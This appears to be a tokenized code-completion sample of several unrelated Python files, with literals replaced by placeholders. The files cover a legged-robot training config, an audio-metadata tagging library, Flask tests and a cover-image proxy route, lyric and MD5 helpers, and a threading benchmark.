max_depenetration_velocity = <NUM_LIT> <EOL> max_gpu_contact_pairs = <NUM_LIT> ** <NUM_LIT> <EOL> default_buffer_size_multiplier = <NUM_LIT> <EOL> contact_collection = <NUM_LIT> <EOL> class LeggedRobotCfgPPO ( BaseConfig ) : <EOL> seed = <NUM_LIT> <EOL> runner_class_name = '<STR_LIT>' <EOL> class policy : <EOL> init_noise_std = <NUM_LIT> <EOL> continue_from_last_std = True <EOL> scan_encoder_dims = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> actor_hidden_dims = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> critic_hidden_dims = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> priv_encoder_dims = [ <NUM_LIT> , <NUM_LIT> ] <EOL> activation = '<STR_LIT>' <EOL> rnn_type = '<STR_LIT>' <EOL> rnn_hidden_size = <NUM_LIT> <EOL> rnn_num_layers = <NUM_LIT> <EOL> tanh_encoder_output = False <EOL> class algorithm : <EOL> value_loss_coef = <NUM_LIT> <EOL> use_clipped_value_loss = True <EOL> clip_param = <NUM_LIT> <EOL> entropy_coef = <NUM_LIT> <EOL> num_learning_epochs = <NUM_LIT> <EOL> num_mini_batches = <NUM_LIT> <EOL> learning_rate = <NUM_LIT> <EOL> schedule = '<STR_LIT>' <EOL> gamma = <NUM_LIT> <EOL> lam = <NUM_LIT> <EOL> desired_kl = <NUM_LIT> <EOL> max_grad_norm = <NUM_LIT> <EOL> dagger_update_freq = <NUM_LIT> <EOL> priv_reg_coef_schedual = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> priv_reg_coef_schedual_resume = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> class depth_encoder : <EOL> if_depth = LeggedRobotCfg . depth . use_camera <EOL> depth_shape = LeggedRobotCfg . depth . resized <EOL> buffer_len = LeggedRobotCfg . depth . buffer_len <EOL> hidden_dims = <NUM_LIT> <EOL> learning_rate = <NUM_LIT> <EOL> num_steps_per_env = LeggedRobotCfg . depth . update_interval * <NUM_LIT> <EOL> class estimator : <EOL> train_with_estimated_states = True <EOL> learning_rate = <NUM_LIT> <EOL> hidden_dims = [ <NUM_LIT> , <NUM_LIT> ] <EOL> priv_states_dim = LeggedRobotCfg . env . n_priv <EOL> num_prop = LeggedRobotCfg . env . n_proprio <EOL> num_scan = LeggedRobotCfg . env . n_scan <EOL> class runner : <EOL> policy_class_name = '<STR_LIT>' <EOL> algorithm_class_name = '<STR_LIT>' <EOL> num_steps_per_env = <NUM_LIT> <EOL> max_iterations = <NUM_LIT> <EOL> save_interval = <NUM_LIT> <EOL> experiment_name = '<STR_LIT>' <EOL> run_name = '<STR_LIT>' <EOL> resume = False <EOL> load_run = - <NUM_LIT> <EOL> checkpoint = - <NUM_LIT> <EOL> resume_path = None <EOL> </s>
<s> try : <EOL> import mutagen . wave <EOL> from component . music_tag . id3 import Id3File <EOL> class WaveId3File ( Id3File ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . wave . WAVE <EOL> def __init__ ( self , filename , ** kwargs ) : <EOL> super ( WaveId3File , self ) . __init__ ( filename , ** kwargs ) <EOL> except ImportError : <EOL> pass <EOL> </s>
<s> from collections import namedtuple <EOL> import hashlib <EOL> import io <EOL> import shutil <EOL> import mutagen <EOL> from mutagen . id3 import PictureType <EOL> try : <EOL> import PIL <EOL> from PIL import Image <EOL> BICUBIC = PIL . Image . BICUBIC <EOL> _HAS_PIL = True <EOL> except ImportError : <EOL> BICUBIC = None <EOL> _HAS_PIL = False <EOL> from . import util <EOL> def getter_not_implemented ( afile , norm_key ) : <EOL> raise NotImplementedError ( "<STR_LIT>" <EOL> "<STR_LIT>" . format ( norm_key , type ( afile ) ) ) <EOL> def setter_not_implemented ( afile , norm_key , val ) : <EOL> raise NotImplementedError ( "<STR_LIT>" <EOL> "<STR_LIT>" . format ( norm_key , type ( afile ) ) ) <EOL> def albumartist_from_comp ( afile , norm_key ) : <EOL> ret = None <EOL> if afile . get ( '<STR_LIT>' , default = None ) : <EOL> ret = '<STR_LIT>' <EOL> return ret <EOL> def comp_from_albumartist ( afile , norm_key ) : <EOL> ret = None <EOL> albumartist = afile . get ( '<STR_LIT>' , default = None ) <EOL> if albumartist : <EOL> albumartist = albumartist . first . lower ( ) . replace ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> if albumartist in ( '<STR_LIT>' , '<STR_LIT>' ) : <EOL> ret = True <EOL> else : <EOL> ret = False <EOL> return ret <EOL> TAG_MAP_ENTRY = namedtuple ( '<STR_LIT>' , ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' ) ) <EOL> TAG_MAP_ENTRY . __new__ . __defaults__ = ( getter_not_implemented , <EOL> setter_not_implemented , <EOL> None , <EOL> str , <EOL> None , <EOL> ) <EOL> class MetadataItem ( object ) : <EOL> def __init__ ( self , typ , sanitizer , val ) : <EOL> self . _values = None <EOL> if isinstance ( val , MetadataItem ) : <EOL> val = val . values <EOL> self . type = typ <EOL> self . sanitizer = sanitizer <EOL> self . values = val <EOL> @ property <EOL> def ismissing ( self ) : <EOL> return bool ( self . values ) <EOL> @ property <EOL> def isna ( self ) : <EOL> return bool ( self . values ) <EOL> @ property <EOL> def values ( self ) : <EOL> return self . _values <EOL> @ values . setter <EOL> def values ( self , val ) : <EOL> if isinstance ( val , ( list , tuple ) ) : <EOL> self . _values = list ( val ) <EOL> elif val is None : <EOL> self . _values = [ ] <EOL> else : <EOL> self . _values = [ val ] <EOL> for i , v in enumerate ( self . _values ) : <EOL> if self . sanitizer is not None : <EOL> v = self . sanitizer ( v ) <EOL> if not ( self . type is None or v is None or isinstance ( v , self . type ) ) : <EOL> v = self . type ( v ) <EOL> self . _values [ i ] = v <EOL> @ property <EOL> def value ( self ) : <EOL> try : <EOL> if self . type is None : <EOL> if len ( self . values ) == <NUM_LIT> : <EOL> val = self . values [ <NUM_LIT> ] <EOL> else : <EOL> val = str ( self ) <EOL> else : <EOL> val = self . type ( self ) <EOL> except TypeError : <EOL> values = self . values <EOL> if not values : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> elif len ( values ) > <NUM_LIT> : <EOL> raise ValueError ( "<STR_LIT>" . format ( repr ( values ) ) ) <EOL> val = values [ <NUM_LIT> ] <EOL> return val <EOL> @ property <EOL> def val ( self ) : <EOL> return self . value <EOL> @ property <EOL> def first ( self ) : <EOL> try : <EOL> return self . _values [ <NUM_LIT> ] <EOL> except IndexError : <EOL> return None <EOL> def append ( self , val ) : <EOL> if self . sanitizer is not None : <EOL> val = self . sanitizer ( val ) <EOL> if not ( self . type is None or val is None or isinstance ( val , self . type ) ) : <EOL> val = self . type ( val ) <EOL> if self . _values : <EOL> self . _values . append ( val ) <EOL> else : <EOL> self . _values = [ val ] <EOL> def __len__ ( self ) : <EOL> return len ( self . _values ) <EOL> def __str__ ( self ) : <EOL> return '<STR_LIT>' . join ( str ( li ) for li in self . _values ) <EOL> def __int__ ( self ) : <EOL> if not self . _values : <EOL> val = <NUM_LIT> <EOL> elif len ( self . _values ) == <NUM_LIT> : <EOL> val = int ( self . _values [ <NUM_LIT> ] ) <EOL> else : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> return val <EOL> def __bool__ ( self ) : <EOL> return any ( self . _values ) <EOL> def __list__ ( self ) : <EOL> return list ( self . _values ) <EOL> def __tuple__ ( self ) : <EOL> return tuple ( self . _values ) <EOL> def __repr__ ( self ) : <EOL> return '<STR_LIT>' . format ( self . __str__ ( ) ) <EOL> class Artwork ( object ) : <EOL> def __init__ ( self , raw , width = None , height = None , fmt = None , depth = None , <EOL> pic_type = PictureType . COVER_FRONT ) : <EOL> if isinstance ( raw , Artwork ) : <EOL> orig = raw <EOL> raw = orig . raw <EOL> width , height = orig . width , orig . height <EOL> fmt , depth = orig . fmt , orig . depth <EOL> pic_type = orig . pic_type <EOL> del orig <EOL> if not isinstance ( raw , bytes ) : <EOL> raise TypeError ( "<STR_LIT>" ) <EOL> self . raw = raw <EOL> if any ( v is None for v in ( width , height , fmt , depth ) ) : <EOL> try : <EOL> img = self . image <EOL> width = img . width <EOL> height = img . height <EOL> fmt = img . format . lower ( ) <EOL> mode2depth = { '<STR_LIT>' : <NUM_LIT> , '<STR_LIT>' : <NUM_LIT> , '<STR_LIT>' : <NUM_LIT> , '<STR_LIT>' : <NUM_LIT> , '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , '<STR_LIT>' : <NUM_LIT> , '<STR_LIT>' : <NUM_LIT> , '<STR_LIT>' : <NUM_LIT> } <EOL> depth = mode2depth [ img . mode ] <EOL> except ImportError : <EOL> width = None <EOL> height = None <EOL> fmt = None <EOL> depth = None <EOL> self . width = width <EOL> self . height = height <EOL> self . depth = depth <EOL> self . format = fmt <EOL> self . mime = "<STR_LIT>" . format ( self . format ) <EOL> self . pic_type = pic_type <EOL> @ property <EOL> def data ( self ) : <EOL> return self . raw <EOL> @ property <EOL> def image ( self ) : <EOL> img = None <EOL> if _HAS_PIL : <EOL> img = Image . open ( io . BytesIO ( self . raw ) ) <EOL> else : <EOL> raise ImportError ( "<STR_LIT>" ) <EOL> return img <EOL> def thumbnail ( self , size , method = BICUBIC ) : <EOL> image = self . image <EOL> image . thumbnail ( size , method ) <EOL> return image <EOL> def raw_thumbnail ( self , size , method = BICUBIC , format = None , quality = <NUM_LIT> , <EOL> return_info = False ) : <EOL> thumb = self . thumbnail ( size , method = method ) <EOL> if format is None : <EOL> format = thumb . format <EOL> with io . BytesIO ( ) as output : <EOL> thumb . save ( output , format = format , quality = quality ) <EOL> raw = output . getvalue ( ) <EOL> if return_info : <EOL> info = { '<STR_LIT>' : thumb . width , '<STR_LIT>' : thumb . height } <EOL> return raw , info <EOL> else : <EOL> return raw <EOL> def __str__ ( self ) : <EOL> md5 = hashlib . md5 ( ) <EOL> md5 . update ( self . data ) <EOL> return "<STR_LIT>" . format ( self . mime , self . width , self . height , <EOL> md5 . hexdigest ( ) ) <EOL> class RawProxy ( object ) : <EOL> def __init__ ( self , parent ) : <EOL> self . parent = parent <EOL> def resolve ( self , norm_key , default = None ) : <EOL> return self . parent . resolve ( norm_key , default , typeless = True ) <EOL> def get ( self , norm_key , default = None ) : <EOL> raw_key = norm_key <EOL> norm_key = self . parent . _normalize_norm_key ( norm_key ) <EOL> if norm_key in self . parent . tag_map : <EOL> md_item = self . parent . get ( norm_key , default = default , typeless = True ) <EOL> return md_item <EOL> else : <EOL> return self . parent . mfile [ raw_key ] <EOL> def set ( self , norm_key , val ) : <EOL> raw_key = norm_key <EOL> norm_key = self . parent . _normalize_norm_key ( norm_key ) <EOL> if norm_key in self . parent . tag_map : <EOL> self . parent . set ( norm_key , val , typeless = True ) <EOL> else : <EOL> self . parent . mfile [ raw_key ] = val <EOL> def __getitem__ ( self , norm_key ) : <EOL> return self . get ( norm_key , default = None ) <EOL> def __setitem__ ( self , norm_key , val ) : <EOL> self . set ( norm_key , val ) <EOL> class NotAppendable ( Exception ) : <EOL> pass <EOL> class AudioFile ( object ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = None <EOL> appendable = True <EOL> _DEFAULT_TAG_ALIASES = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> } <EOL> _DEFAULT_TAG_MAP = { <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( type = int , sanitizer = util . sanitize_year ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( type = bool ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( type = Artwork ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , type = float ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , type = int ) , <EOL> } <EOL> _DEFAULT_RESOLVERS = { <EOL> '<STR_LIT>' : ( '<STR_LIT>' , albumartist_from_comp , '<STR_LIT>' ) , <EOL> '<STR_LIT>' : ( '<STR_LIT>' , '<STR_LIT>' ) , <EOL> '<STR_LIT>' : ( '<STR_LIT>' , comp_from_albumartist ) , <EOL> '<STR_LIT>' : ( '<STR_LIT>' , <EOL> lambda afile , norm_key : <NUM_LIT> <EOL> ) , <EOL> '<STR_LIT>' : ( '<STR_LIT>' , <EOL> lambda afile , norm_key : afile . get ( '<STR_LIT>' , <NUM_LIT> ) <EOL> ) , <EOL> } <EOL> _DEFAULT_SINGULAR_KEYS = [ '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , <EOL> ] <EOL> _TAG_ALIASES = { } <EOL> _TAG_MAP = { } <EOL> _RESOLVERS = { } <EOL> _SINGULAR_KEYS = [ ] <EOL> def __init__ ( self , filename , _mfile = None ) : <EOL> self . tag_aliases = self . _DEFAULT_TAG_ALIASES . copy ( ) <EOL> self . tag_aliases . update ( self . _TAG_ALIASES ) <EOL> self . tag_map = self . _DEFAULT_TAG_MAP . copy ( ) <EOL> self . tag_map . update ( self . _TAG_MAP ) <EOL> self . resolvers = self . _DEFAULT_RESOLVERS . copy ( ) <EOL> self . resolvers . update ( self . _RESOLVERS ) <EOL> self . singular_keys = self . _DEFAULT_SINGULAR_KEYS . copy ( ) <EOL> self . singular_keys += self . _SINGULAR_KEYS <EOL> self . filename = filename <EOL> if _mfile is None : <EOL> self . mfile = mutagen . File ( filename ) <EOL> else : <EOL> self . mfile = _mfile <EOL> if self . mfile . tags is None : <EOL> self . mfile . add_tags ( ) <EOL> @ property <EOL> def raw ( self ) : <EOL> return RawProxy ( self ) <EOL> def save ( self , filename = None , ** kwargs ) : <EOL> if filename is None : <EOL> self . mfile . save ( ** kwargs ) <EOL> filename = self . filename <EOL> else : <EOL> shutil . copyfile ( self . filename , filename ) <EOL> self . mfile . save ( filename , ** kwargs ) <EOL> def _normalize_norm_key ( self , norm_key ) : <EOL> norm_key = norm_key . replace ( '<STR_LIT>' , '<STR_LIT>' ) . replace ( '<STR_LIT>' , '<STR_LIT>' ) . replace ( '<STR_LIT>' , '<STR_LIT>' ) . lower ( ) <EOL> if self . tag_aliases and norm_key in self . tag_aliases : <EOL> norm_key = self . tag_aliases [ norm_key ] <EOL> return norm_key <EOL> def resolve ( self , norm_key , default = None , typeless = False ) : <EOL> norm_key = self . _normalize_norm_key ( norm_key ) <EOL> tmap = self . tag_map [ norm_key ] <EOL> md_type = None if typeless else tmap . type <EOL> md_sanitizer = None if typeless else tmap . sanitizer <EOL> ret = None <EOL> if norm_key in self . resolvers : <EOL> for resolver in self . resolvers [ norm_key ] : <EOL> if hasattr ( resolver , '<STR_LIT>' ) : <EOL> ret = resolver ( self , norm_key ) <EOL> else : <EOL> ret = self . get ( resolver , default = None , _raw_default = True , <EOL> typeless = typeless ) <EOL> if ret is not None : <EOL> break <EOL> else : <EOL> ret = self . get ( norm_key , default = None , _raw_default = True , <EOL> typeless = typeless ) <EOL> if not ( ret is None or isinstance ( ret , MetadataItem ) ) : <EOL> ret = MetadataItem ( md_type , md_sanitizer , ret ) <EOL> if ret is None : <EOL> ret = MetadataItem ( md_type , md_sanitizer , default ) <EOL> return ret <EOL> def _ft_getter ( self , key ) : <EOL> return self . mfile . tags . get ( key , None ) <EOL> def get ( self , norm_key , default = None , _raw_default = False , typeless = False ) : <EOL> norm_key = self . _normalize_norm_key ( norm_key ) <EOL> tmap = self . tag_map [ norm_key ] <EOL> md_type = None if typeless else tmap . type <EOL> md_sanitizer = None if typeless else tmap . sanitizer <EOL> ret = None <EOL> if hasattr ( tmap . getter , '<STR_LIT>' ) : <EOL> val = tmap . getter ( self , norm_key ) <EOL> ret = None if val is None else MetadataItem ( md_type , md_sanitizer , <EOL> val ) <EOL> elif norm_key . startswith ( '<STR_LIT>' ) : <EOL> val = getattr ( self . mfile . info , tmap . getter ) <EOL> if not typeless : <EOL> val = tmap . type ( val ) <EOL> ret = None if val is None else MetadataItem ( md_type , md_sanitizer , <EOL> val ) <EOL> elif isinstance ( tmap . getter , ( list , tuple ) ) : <EOL> val = None <EOL> for getter in tmap . getter : <EOL> if val is not None : <EOL> break <EOL> if hasattr ( getter , '<STR_LIT>' ) : <EOL> val = getter ( self , norm_key ) <EOL> elif getter in self . mfile . tags : <EOL> val = self . _ft_getter ( getter ) <EOL> ret = None if val is None else MetadataItem ( md_type , md_sanitizer , <EOL> val ) <EOL> else : <EOL> try : <EOL> val = self . _ft_getter ( tmap . getter ) <EOL> except KeyError : <EOL> val = None <EOL> ret = None if val is None else MetadataItem ( md_type , md_sanitizer , <EOL> val ) <EOL> if ret is None : <EOL> if _raw_default : <EOL> ret = default <EOL> else : <EOL> ret = MetadataItem ( md_type , md_sanitizer , default ) <EOL> return ret <EOL> def _ft_setter ( self , key , md_val , appendable = True ) : <EOL> if self . appendable and appendable : <EOL> self . mfile . tags [ key ] = md_val . values <EOL> else : <EOL> self . mfile . tags [ key ] = md_val . value <EOL> def set_raw ( self , norm_key , key , md_val , appendable = True ) : <EOL> if not isinstance ( md_val , MetadataItem ) : <EOL> if isinstance ( md_val , ( list , tuple ) ) : <EOL> md_val = MetadataItem ( type ( md_val [ <NUM_LIT> ] ) , None , md_val ) <EOL> else : <EOL> md_val = MetadataItem ( type ( md_val ) , None , md_val ) <EOL> appendable = appendable and norm_key not in self . singular_keys <EOL> if norm_key in self . singular_keys and len ( md_val . values ) > <NUM_LIT> : <EOL> raise ValueError ( "<STR_LIT>" <EOL> "<STR_LIT>" . format ( norm_key , md_val . values ) ) <EOL> try : <EOL> self . _ft_setter ( key , md_val , appendable = appendable ) <EOL> except ( TypeError , ValueError ) : <EOL> try : <EOL> v = [ str ( vi ) for vi in md_val . values ] <EOL> self . _ft_setter ( key , MetadataItem ( str , None , v ) , <EOL> appendable = appendable ) <EOL> except Exception : <EOL> success = False <EOL> else : <EOL> success = True <EOL> if not success : <EOL> raise <EOL> def set ( self , norm_key , val , typeless = False ) : <EOL> norm_key = self . _normalize_norm_key ( norm_key ) <EOL> tmap = self . tag_map [ norm_key ] <EOL> md_type = None if typeless else tmap . type <EOL> md_sanitizer = None if typeless else tmap . sanitizer <EOL> if not isinstance ( val , MetadataItem ) : <EOL> val = MetadataItem ( md_type , md_sanitizer , val ) <EOL> if hasattr ( tmap . setter , '<STR_LIT>' ) : <EOL> tmap . setter ( self , norm_key , val ) <EOL> elif norm_key . startswith ( '<STR_LIT>' ) : <EOL> raise KeyError ( "<STR_LIT>" ) <EOL> elif isinstance ( tmap . setter , ( list , tuple ) ) : <EOL> value_set = False <EOL> for setter in tmap . setter : <EOL> if value_set : <EOL> break <EOL> if hasattr ( tmap . setter , '<STR_LIT>' ) : <EOL> tmap . setter ( self , norm_key , val ) <EOL> value_set = True <EOL> elif setter in self . mfile . tags : <EOL> self . set_raw ( norm_key , setter , val ) <EOL> value_set = True <EOL> if not value_set : <EOL> self . set_raw ( norm_key , tmap . setter [ <NUM_LIT> ] , val ) <EOL> else : <EOL> self . set_raw ( norm_key , tmap . setter , val ) <EOL> def append_tag ( self , norm_key , val ) : <EOL> norm_key = self . _normalize_norm_key ( norm_key ) <EOL> if not self . appendable : <EOL> raise NotAppendable ( "<STR_LIT>" <EOL> "<STR_LIT>" . format ( self . __class__ . __name__ ) ) <EOL> if norm_key in self . singular_keys : <EOL> raise NotAppendable ( "<STR_LIT>" <EOL> "<STR_LIT>" . format ( self . __class__ . __name__ , norm_key ) ) <EOL> existing_val = self . get ( norm_key , default = None ) <EOL> if existing_val is None : <EOL> new_val = val <EOL> else : <EOL> existing_val . append ( val ) <EOL> new_val = existing_val <EOL> self . set ( norm_key , new_val ) <EOL> def append ( self , norm_key , val ) : <EOL> return self . append_tag ( norm_key , val ) <EOL> def _ft_rmtag ( self , key ) : <EOL> if key in self . mfile . tags : <EOL> del self . mfile . tags [ key ] <EOL> def remove_tag ( self , norm_key ) : <EOL> norm_key = self . _normalize_norm_key ( norm_key ) <EOL> if norm_key . startswith ( '<STR_LIT>' ) : <EOL> raise KeyError ( "<STR_LIT>" <EOL> "<STR_LIT>" ) <EOL> tmap = self . tag_map [ norm_key ] <EOL> remover = None <EOL> if tmap . remover : <EOL> remover = tmap . remover <EOL> if not remover : <EOL> if isinstance ( tmap . getter , ( list , tuple ) ) : <EOL> remover = [ g for g in tmap . getter if isinstance ( g , util . string_types ) ] <EOL> if isinstance ( tmap . getter , util . string_types ) : <EOL> remover = [ tmap . getter ] <EOL> if not remover : <EOL> if isinstance ( tmap . setter , ( list , tuple ) ) : <EOL> remover = [ s for s in tmap . setter if isinstance ( s , util . string_types ) ] <EOL> if isinstance ( tmap . setter , util . string_types ) : <EOL> remover = [ tmap . setter ] <EOL> if remover is not None : <EOL> if hasattr ( remover , '<STR_LIT>' ) : <EOL> remover ( self , norm_key ) <EOL> elif isinstance ( remover , ( list , tuple ) ) : <EOL> for key in remover : <EOL> self . _ft_rmtag ( key ) <EOL> elif isinstance ( remover , util . string_types ) : <EOL> self . _ft_rmtag ( remover ) <EOL> def info ( self , tags = None , show_empty = False , resolve = False ) : <EOL> if not tags : <EOL> tags = self . _TAG_MAP . keys ( ) <EOL> t_lst = [ ] <EOL> for tag in tags : <EOL> if resolve : <EOL> mdi = self . resolve ( tag , None ) <EOL> else : <EOL> mdi = self . get ( tag , None ) <EOL> if mdi or show_empty : <EOL> t_lst . append ( '<STR_LIT>' . format ( tag , str ( mdi ) ) ) <EOL> return '<STR_LIT>' . join ( t_lst ) <EOL> def __getitem__ ( self , norm_key ) : <EOL> return self . get ( norm_key , default = None ) <EOL> def __setitem__ ( self , norm_key , val ) : <EOL> self . set ( norm_key , val ) <EOL> def __contains__ ( self , key ) : <EOL> return self [ key ] . values != [ ] <EOL> def __delitem__ ( self , norm_key ) : <EOL> self . remove_tag ( norm_key ) <EOL> def __str__ ( self ) : <EOL> return self . info ( show_empty = True ) <EOL> </s>
<s> from app import app <EOL> def test_home_route ( ) : <EOL> with app . test_client ( ) as client : <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert response . status_code < <NUM_LIT> <EOL> def test_source_route ( ) : <EOL> with app . test_client ( ) as client : <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert response . status_code < <NUM_LIT> <EOL> def test_lyrics_route ( ) : <EOL> with app . test_client ( ) as client : <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert response . status_code < <NUM_LIT> <EOL> </s>
<s> import hashlib <EOL> import re <EOL> def calculate_md5 ( string : str , base = "<STR_LIT>" ) : <EOL> md5_hash = hashlib . md5 ( ) <EOL> md5_hash . update ( string . encode ( '<STR_LIT>' ) ) <EOL> if base == "<STR_LIT>" : <EOL> md5_hex = md5_hash . hexdigest ( ) <EOL> return md5_hex <EOL> elif base == "<STR_LIT>" : <EOL> md5_dec = int ( md5_hash . hexdigest ( ) , <NUM_LIT> ) <EOL> return md5_dec <EOL> elif base == "<STR_LIT>" : <EOL> md5_bin = format ( int ( md5_hash . hexdigest ( ) , <NUM_LIT> ) , '<STR_LIT>' ) <EOL> return md5_bin <EOL> elif base == "<STR_LIT>" : <EOL> md5_bytes = md5_hash . digest ( ) <EOL> return md5_bytes . hex ( ) <EOL> else : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> def merge_dictionaries ( dict_a : dict , dict_b : dict ) -> dict : <EOL> merged_dict = { } <EOL> if type ( dict_a ) is not dict : <EOL> return dict_b <EOL> for key in set ( dict_a . keys ( ) ) | set ( dict_b . keys ( ) ) : <EOL> value_a = dict_a . get ( key ) <EOL> value_b = dict_b . get ( key ) <EOL> if value_a and value_b : <EOL> merged_dict [ key ] = value_a <EOL> elif not value_a : <EOL> merged_dict [ key ] = value_b <EOL> elif not value_b : <EOL> merged_dict [ key ] = value_a <EOL> else : <EOL> merged_dict [ key ] = value_a <EOL> return merged_dict <EOL> def standard_lrc ( lrc_text : str ) -> str : <EOL> if not lrc_text or type ( lrc_text ) is not str : <EOL> return lrc_text <EOL> elif '<STR_LIT>' in lrc_text and '<STR_LIT>' in lrc_text : <EOL> lrc_text = lrc_text . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> pattern = re . compile ( r'<STR_LIT>' ) <EOL> matches = pattern . findall ( lrc_text ) <EOL> for match_s in matches : <EOL> replacement = '<STR_LIT>' + '<STR_LIT>' . join ( match_s . split ( '<STR_LIT>' ) ) + '<STR_LIT>' <EOL> lrc_text = lrc_text . replace ( f'<STR_LIT>' , replacement ) <EOL> pattern = r"<STR_LIT>" <EOL> return re . sub ( pattern , lambda match : "<STR_LIT>" + match . group ( <NUM_LIT> ) + "<STR_LIT>" , lrc_text ) <EOL> else : <EOL> return lrc_text . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> </s>
<s> from . import * <EOL> import requests <EOL> from flask import request , abort , redirect <EOL> def follow_redirects ( url , max_redirects = <NUM_LIT> ) : <EOL> for _ in range ( max_redirects ) : <EOL> response = requests . head ( url , allow_redirects = False ) <EOL> if response . status_code == <NUM_LIT> : <EOL> return url <EOL> elif <NUM_LIT> <= response . status_code < <NUM_LIT> : <EOL> url = response . headers [ '<STR_LIT>' ] <EOL> else : <EOL> abort ( <NUM_LIT> ) <EOL> abort ( <NUM_LIT> ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> @ cache . cached ( timeout = <NUM_LIT> , key_prefix = make_cache_key ) <EOL> def cover_api ( ) : <EOL> req_args = { key : request . args . get ( key ) for key in request . args } <EOL> target_url = '<STR_LIT>' + '<STR_LIT>' . join ( [ f"<STR_LIT>" for key in req_args ] ) <EOL> result = requests . get ( target_url , headers = { "<STR_LIT>" : "<STR_LIT>" } ) <EOL> if result . status_code == <NUM_LIT> : <EOL> return result . content , <NUM_LIT> , { "<STR_LIT>" : result . headers [ '<STR_LIT>' ] } <EOL> elif result . status_code == <NUM_LIT> : <EOL> abort ( <NUM_LIT> ) <EOL> else : <EOL> abort ( <NUM_LIT> ) <EOL> @ v1_bp . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> @ cache . cached ( timeout = <NUM_LIT> , key_prefix = make_cache_key ) <EOL> def cover_new ( s_type ) : <EOL> __endpoints__ = [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] <EOL> if s_type not in __endpoints__ : <EOL> abort ( <NUM_LIT> ) <EOL> req_args = { key : request . args . get ( key ) for key in request . args } <EOL> target_url = f'<STR_LIT>' + '<STR_LIT>' . join ( [ f"<STR_LIT>" for key in req_args ] ) <EOL> return redirect ( target_url , <NUM_LIT> ) <EOL> </s>
<s> import time <EOL> import threading <EOL> class Benchmark : <EOL> def __init__ ( self , threads = <NUM_LIT> , rounds = <NUM_LIT> ) : <EOL> self . threads = threads <EOL> self . rounds = rounds <EOL> def _work ( self , func , * args , ** kwargs ) : <EOL> for i in range ( self . rounds ) : <EOL> func ( * args , ** kwargs ) <EOL> return <EOL> def run ( self , func , * args , ** kwargs ) : <EOL> threads = [ ] <EOL> for i in range ( self . threads ) : <EOL> t = threading . Thread ( target = self . _work , args = ( func , * args ) , kwargs = kwargs ) <EOL> threads . append ( t ) <EOL> start = time . time ( ) <EOL> for t in threads : <EOL> t . start ( ) <EOL> for t in threads : <EOL> t . join ( ) <EOL> end = time . time ( ) <EOL> all_time = end - start <EOL> avg_time = all_time / ( self . threads * self . rounds ) <EOL> return all_time , avg_time <EOL> </s>
